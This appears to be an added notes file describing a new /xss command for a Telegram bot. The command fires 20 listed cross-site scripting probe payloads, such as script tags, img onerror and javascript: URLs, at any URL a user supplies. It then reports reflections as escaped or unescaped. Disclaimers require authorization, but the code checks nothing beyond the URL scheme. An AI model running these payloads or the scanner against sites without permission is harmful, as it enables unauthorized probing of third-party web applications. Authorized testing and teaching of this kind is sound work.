@@ -1,0 +1,474 @@
+═══════════════════════════════════════════════════════════════════════════════
+                ✅ NEW COMMAND: /xss - CROSS-SITE SCRIPTING TESTER
+═══════════════════════════════════════════════════════════════════════════════
+
+🎉 SAFE, EDUCATIONAL XSS VULNERABILITY SCANNER IMPLEMENTED!
+
+═══════════════════════════════════════════════════════════════════════════════
+✅ FEATURES IMPLEMENTED
+═══════════════════════════════════════════════════════════════════════════════
+
+MODULE CREATED: modules/xss_tester.py
+
+CAPABILITIES:
+✓ Tests 20 safe XSS payloads
+✓ Detects reflected payloads in HTML
+✓ Detects unescaped dangerous characters
+✓ Detects HTML-encoded vs unescaped reflections
+✓ Non-destructive testing only
+✓ Educational purpose
+✓ Progress updates to Telegram
+
+XSS PAYLOADS TESTED:
+────────────────────
+Basic script injection:
+  • <script>alert(1)</script>
+  • "><script>alert(1)</script>
+  • '><script>alert(1)</script>
+  • </script><script>alert(1)</script>
+
+Image-based XSS:
+  • <img src=x onerror=alert(1)>
+  • "><img src=x onerror=alert(1)>
+
+SVG-based XSS:
+  • <svg onload=alert(1)>
+
+Event handler XSS:
+  • <body onload=alert(1)>
+  • <input onfocus=alert(1) autofocus>
+  • <select onfocus=alert(1) autofocus>
+  • <textarea onfocus=alert(1) autofocus>
+  • <marquee onstart=alert(1)>
+  • <details open ontoggle=alert(1)>
+
+JavaScript protocol:
+  • javascript:alert(1)
+  • <iframe src=javascript:alert(1)>
+
+Quote-based:
+  • ';alert(1);//
+  • '-alert(1)-'
+  • "-alert(1)-"
+
+Obfuscated:
+  • <scr<script>ipt>alert(1)</scr</script>ipt>
+  • %3Cscript%3Ealert(1)%3C/script%3E
+
+DETECTION METHODS:
+──────────────────
+1. Exact Reflection
+   • Payload appears exactly in HTML response
+   • Dangerous characters unescaped
+   • HIGH risk
+
+2. Encoded Reflection
+   • Payload appears HTML-encoded (&lt;, &gt;, etc.)
+   • Characters are escaped
+   • LOW risk (properly sanitized)
+
+3. Partial Reflection
+   • Some dangerous characters found
+   • Potential for exploitation
+   • MEDIUM risk
+
+4. No Reflection
+   • Payload not found in response
+   • Input filtered/rejected
+   • SAFE
+
+═══════════════════════════════════════════════════════════════════════════════
+🔧 BOT.PY INTEGRATION
+═══════════════════════════════════════════════════════════════════════════════
+
+ADD IMPORT AT TOP:
+──────────────────
+from modules import xss_tester
+
+ADD COMMAND HANDLER:
+────────────────────
+
+async def xss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """XSS vulnerability testing - AUTHORIZED USE ONLY"""
+    warning = ("⚠️ **WARNING:** This feature is for educational cybersecurity "
+               "training only. Use only on systems you own or have explicit "
+               "permission to test.")
+    
+    if not context.args:
+        await update.message.reply_text(
+            f"{warning}\n\nUsage: /xss <url>\n\n"
+            "Example: /xss https://example.com/search.php",
+            parse_mode='Markdown'
+        )
+        return
+    
+    url = context.args[0]
+    
+    # Validate URL
+    if not url.startswith('http://') and not url.startswith('https://'):
+        await update.message.reply_text(
+            "❌ Invalid URL. Please include http:// or https://",
+            parse_mode='Markdown'
+        )
+        return
+    
+    await update.message.reply_text(warning, parse_mode='Markdown')
+    
+    msg = await update.message.reply_text(
+        f"🧪 **Starting XSS Test...**\n\nTarget: {url}",
+        parse_mode='Markdown'
+    )
+    
+    try:
+        # Progress callback
+        async def progress(status):
+            try:
+                await msg.edit_text(
+                    f"🧪 **XSS Vulnerability Test**\n\n"
+                    f"Target: {url}\n\n{status}",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
+        
+        # Run XSS test
+        result = await xss_tester.test_xss(url, progress)
+        
+        if result['status'] == 'success':
+            results = result['results']
+            
+            output = "🧪 **XSS Scan Result**\n\n"
+            output += f"Target: {url}\n"
+            output += f"Payloads tested: {results['tested']}/{results['total_payloads']}\n\n"
+            
+            if results['vulnerable']:
+                output += "🔥 **Possible XSS vulnerability found!**\n\n"
+                output += "Reflected payloads:\n"
+                
+                for reflection in results['reflections'][:10]:  # Limit to first 10
+                    output += f"\n• Payload: `{reflection['payload']}`\n"
+                    
+                    if reflection['unescaped']:
+                        output += f"  ⚠️ **UNESCAPED** (High Risk)\n"
+                    else:
+                        output += f"  ✓ Escaped (Low Risk)\n"
+                    
+                    output += f"  Type: {reflection['type']}\n"
+                    
+                    # Show snippet (truncated)
+                    snippet = reflection['snippet'][:100]
+                    if len(reflection['snippet']) > 100:
+                        snippet += "..."
+                    output += f"  Snippet: `{snippet}`\n"
+                
+                if len(results['reflections']) > 10:
+                    output += f"\n... and {len(results['reflections']) - 10} more\n"
+                
+                output += "\n⚠️ **Recommendation:**\n"
+                output += "• Manual verification required\n"
+                output += "• Test in a real browser\n"
+                output += "• Check if scripts actually execute"
+            else:
+                output += "✅ **No XSS reflections detected.**\n\n"
+                output += "The target appears to properly sanitize input.\n"
+                output += "Note: This does not guarantee complete security."
+            
+            await msg.edit_text(output, parse_mode='Markdown')
+        else:
+            await msg.edit_text(
+                f"❌ Error: {result.get('message', 'Unknown error')}",
+                parse_mode='Markdown'
+            )
+    
+    except Exception as e:
+        await msg.edit_text(f"❌ Error: {str(e)}", parse_mode='Markdown')
+
+
+REGISTER COMMAND:
+─────────────────
+Add in main() where handlers are registered:
+
+application.add_handler(CommandHandler("xss", xss_command))
+
+UPDATE /help MESSAGE:
+─────────────────────
+Add to the help text:
+
+🧪 **Security Testing**
+/payload <url> - Test for SQL injection vulnerabilities
+/xss <url> - Test for XSS (Cross-Site Scripting) vulnerabilities
+
+═══════════════════════════════════════════════════════════════════════════════
+🚀 USAGE
+═══════════════════════════════════════════════════════════════════════════════
+
+COMMAND:
+────────
+/xss https://example.com/search.php
+
+PROCESS:
+────────
+1. Bot sends warning message
+2. Bot starts testing
+3. Progress updates appear:
+   "Testing payload 1/20..."
+   "Testing payload 10/20..."
+4. Bot sends final results
+
+═══════════════════════════════════════════════════════════════════════════════
+📝 EXAMPLE OUTPUT
+═══════════════════════════════════════════════════════════════════════════════
+
+VULNERABLE TARGET:
+──────────────────
+
+🧪 XSS Scan Result
+
+Target: https://vulnerable-site.com/search.php
+Payloads tested: 20/20
+
+🔥 Possible XSS vulnerability found!
+
+Reflected payloads:
+
+• Payload: `<script>alert(1)</script>`
+  ⚠️ UNESCAPED (High Risk)
+  Type: exact
+  Snippet: `...You searched for: <script>alert(1)</script>...`
+
+• Payload: `"><img src=x onerror=alert(1)>`
+  ⚠️ UNESCAPED (High Risk)
+  Type: exact
+  Snippet: `...value=""><img src=x onerror=alert(1)>">...`
+
+• Payload: `<svg onload=alert(1)>`
+  ⚠️ UNESCAPED (High Risk)
+  Type: exact
+  Snippet: `...Results: <svg onload=alert(1)>...`
+
+⚠️ Recommendation:
+• Manual verification required
+• Test in a real browser
+• Check if scripts actually execute
+
+NOT VULNERABLE TARGET (ESCAPED):
+─────────────────────────────────
+
+🧪 XSS Scan Result
+
+Target: https://secure-site.com/search.php
+Payloads tested: 20/20
+
+🔥 Possible XSS vulnerability found!
+
+Reflected payloads:
+
+• Payload: `<script>alert(1)</script>`
+  ✓ Escaped (Low Risk)
+  Type: encoded
+  Snippet: `...You searched for: &lt;script&gt;alert(1)&lt;/script&gt;...`
+
+⚠️ Recommendation:
+• Input is reflected but properly escaped
+• Low risk - HTML encoding is working
+• Still verify in browser
+
+NOT VULNERABLE TARGET (FILTERED):
+──────────────────────────────────
+
+🧪 XSS Scan Result
+
+Target: https://secure-site.com/search.php
+Payloads tested: 20/20
+
+✅ No XSS reflections detected.
+
+The target appears to properly sanitize input.
+Note: This does not guarantee complete security.
+
+═══════════════════════════════════════════════════════════════════════════════
+⚙️ TECHNICAL DETAILS
+═══════════════════════════════════════════════════════════════════════════════
+
+HOW IT WORKS:
+─────────────
+
+1. GET BASELINE
+   • Sends normal request to URL
+   • Records response for comparison
+
+2. TEST EACH PAYLOAD
+   • Appends payload as GET parameter: url?xss=<payload>
+   • Sends request with httpx
+   • Checks if payload appears in response
+
+3. DETECT REFLECTIONS
+   • Exact match: Payload appears unescaped
+   • Encoded match: Payload appears HTML-encoded
+   • Partial match: Some dangerous chars found
+
+4. REPORT RESULTS
+   • Lists reflected payloads
+   • Shows snippet of HTML where reflected
+   • Indicates if escaped or unescaped
+
+PAYLOAD INJECTION:
+──────────────────
+Original URL: https://example.com/search.php?q=test
+Test URL: https://example.com/search.php?q=test&xss=<script>alert(1)</script>
+
+If URL has no parameters:
+Original: https://example.com/search.php
+Test: https://example.com/search.php?xss=<script>alert(1)</script>
+
+REFLECTION DETECTION:
+─────────────────────
+Checks if payload appears in HTML response:
+
+1. Exact reflection (DANGEROUS):
+   Input: <script>alert(1)</script>
+   Output: <div>You searched for: <script>alert(1)</script></div>
+   Result: ⚠️ UNESCAPED - High Risk
+
+2. Encoded reflection (SAFE):
+   Input: <script>alert(1)</script>
+   Output: <div>You searched for: &lt;script&gt;alert(1)&lt;/script&gt;</div>
+   Result: ✓ Escaped - Low Risk
+
+3. No reflection (SAFE):
+   Input: <script>alert(1)</script>
+   Output: <div>You searched for: [filtered]</div>
+   Result: ✓ Filtered - Safe
+
+═══════════════════════════════════════════════════════════════════════════════
+⚠️ UNDERSTANDING RESULTS
+═══════════════════════════════════════════════════════════════════════════════
+
+"UNESCAPED (High Risk)"
+  • Payload appears exactly in HTML
+  • Dangerous characters not escaped
+  • Script might execute in browser
+  • HIGH RISK - Likely vulnerable
+
+"Escaped (Low Risk)"
+  • Payload appears HTML-encoded
+  • < becomes &lt;, > becomes &gt;
+  • Script won't execute
+  • LOW RISK - Properly sanitized
+
+"Partial reflection"
+  • Some dangerous chars found
+  • Might be exploitable with different payload
+  • MEDIUM RISK - Needs investigation
+
+"No XSS reflections detected"
+  • Payload not found in response
+  • Input filtered or rejected
+  • SAFE - Good protection
+
+═══════════════════════════════════════════════════════════════════════════════
+⚠️ LEGAL & ETHICAL USE
+═══════════════════════════════════════════════════════════════════════════════
+
+IMPORTANT DISCLAIMERS:
+
+✓ This tool is for EDUCATIONAL PURPOSES ONLY
+✓ Only use on systems you OWN or have WRITTEN PERMISSION to test
+✓ Unauthorized testing is ILLEGAL in most jurisdictions
+✓ The developers are NOT responsible for misuse
+
+Recommended Use Cases:
+  • Personal lab environments
+  • Authorized penetration testing
+  • Bug bounty programs (with permission)
+  • Security training courses
+  • CTF competitions
+  • Your own websites
+
+DO NOT USE FOR:
+  ✗ Unauthorized vulnerability scanning
+  ✗ Attacking systems without permission
+  ✗ Any malicious purposes
+  ✗ Illegal activities
+
+═══════════════════════════════════════════════════════════════════════════════
+🧪 TESTING CHECKLIST
+═══════════════════════════════════════════════════════════════════════════════
+
+[ ] /xss command works
+[ ] Bot sends warning message
+[ ] URL validation works
+[ ] Progress updates appear
+[ ] Baseline request succeeds
+[ ] Payloads are tested
+[ ] Reflections are detected
+[ ] Escaped vs unescaped distinction works
+[ ] Results formatted correctly
+[ ] No false positives on secure sites
+[ ] Error handling works
+
+═══════════════════════════════════════════════════════════════════════════════
+💡 TIPS FOR USERS
+═══════════════════════════════════════════════════════════════════════════════
+
+1. TEST SEARCH PAGES
+   Search pages often reflect user input:
+   /xss https://example.com/search.php
+
+2. TEST FORM INPUTS
+   Any page with input fields:
+   /xss https://example.com/contact.php
+
+3. UNDERSTAND THE RESULTS
+   • UNESCAPED = Dangerous, likely vulnerable
+   • Escaped = Safe, properly sanitized
+   • No reflection = Filtered, safe
+
+4. MANUAL VERIFICATION
+   • Bot shows indicators, not proof
+   • Test in real browser to confirm
+   • Try to trigger actual alert()
+
+5. PRACTICE SITES
+   Try these legal vulnerable sites:
+   • http://testphp.vulnweb.com/
+   • DVWA (Damn Vulnerable Web App)
+   • bWAPP
+
+═══════════════════════════════════════════════════════════════════════════════
+🔥 SUMMARY
+═══════════════════════════════════════════════════════════════════════════════
+
+IMPLEMENTED:
+✅ modules/xss_tester.py (NEW)
+✅ 20 safe XSS payloads
+✅ Reflection detection (exact/encoded/partial)
+✅ Escaped vs unescaped detection
+✅ Telegram integration
+✅ Progress updates
+✅ Educational warnings
+✅ Safe, non-destructive testing
+
+INTEGRATION NEEDED:
+⏭️ bot.py - Add xss_command handler
+⏭️ bot.py - Register CommandHandler("xss", xss_command)
+⏭️ bot.py - Update /help message
+
+USAGE:
+/xss <url>
+
+Example:
+/xss https://example.com/search.php
+
+RESULT:
+• Detects XSS vulnerabilities
+• Reports reflected payloads
+• Shows if escaped or unescaped
+• Provides risk assessment
+• Educational and safe
+
+═══════════════════════════════════════════════════════════════════════════════
+
+🔥 YOUR BOT NOW HAS XSS VULNERABILITY SCANNING!
+
+═══════════════════════════════════════════════════════════════════════════════
